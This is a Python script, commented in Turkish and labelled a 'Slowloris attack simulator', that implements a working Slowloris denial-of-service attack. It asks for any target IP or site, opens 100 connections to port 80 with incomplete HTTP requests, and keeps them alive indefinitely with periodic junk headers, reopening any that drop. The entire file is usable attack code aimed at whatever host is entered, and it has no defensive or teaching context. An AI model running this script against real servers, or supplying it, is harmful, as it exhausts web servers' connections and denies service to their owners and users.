import socket
import time
import random

print("--- SLOWLORIS ATTACK SIMULATOR ---")
target_ip = input("Hedef IP/Site: ")
port = 80
socket_count = 100 # Kaç tane "yavaş" bağlantı açılacak

sockets = []

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, 80))
    # Yarım bırakılmış HTTP isteği
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    s.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
    return s

print(f"🔥 Saldırı Başlıyor: {target_ip} üzerine {socket_count} soket...")

# Soketleri aç
for _ in range(socket_count):
    try:
        s = init_socket(target_ip)
        sockets.append(s)
    except:
        pass

while True:
    print(f"Soketler canlı tutuluyor... (Sunucu meşgul ediliyor)")
    for s in list(sockets):
        try:
            # Sunucuyu oyalamak için anlamsız header yolla
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except:
            sockets.remove(s)
            # Düşen soket yerine yenisini aç
            try:
                sockets.append(init_socket(target_ip))
            except:
                pass
    time.sleep(10) # 10 saniyede bir gıdıkla